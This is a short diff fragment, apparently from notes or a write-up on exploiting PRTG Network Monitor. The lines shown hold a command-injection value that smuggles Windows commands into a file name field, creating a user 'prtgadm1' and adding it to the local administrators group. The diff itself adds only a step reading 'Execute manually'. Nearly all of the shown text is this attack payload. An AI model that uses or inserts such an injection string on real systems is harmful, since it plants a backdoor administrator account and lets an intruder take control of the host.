@@ -10,3 +10,4 @@
 ```
 test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add.
 ```
+5. Execute manually
